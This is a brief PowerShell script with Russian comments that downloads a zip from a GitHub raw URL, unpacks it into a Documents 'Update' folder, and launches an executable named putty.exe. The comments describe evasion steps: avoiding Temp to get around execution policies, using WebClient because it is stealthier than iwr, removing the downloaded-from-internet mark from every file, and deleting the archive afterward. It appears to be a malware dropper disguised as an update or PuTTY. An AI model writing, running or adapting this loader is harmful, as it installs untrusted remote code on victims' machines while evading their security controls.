$url = "https://github.com/mahmed9203/under888/raw/refs/heads/main/222.zip"
# Используем папку Documents, так как из Temp часто запрещен запуск политиками
$dir = "$env:USERPROFILE\Documents\Update"
$zip = "$dir\222.zip"
$exe = "$dir\putty.exe"

# Создаем папку, если ее нет
if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force }

# Скачивание через WebClient (более скрытно, чем iwr)
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $zip)

# Снимаем блокировку "скачано из интернета" с архива
Unblock-File -Path $zip

# Распаковка
Expand-Archive -Path $zip -DestinationPath $dir -Force

# Снимаем блокировку со всех извлеченных файлов (включая exe)
Get-ChildItem -Path $dir -Recurse | Unblock-File

# Запуск
if (Test-Path $exe) {
    Start-Process -FilePath $exe -WorkingDirectory $dir
}

# Очистка архива
Remove-Item -Path $zip -Force
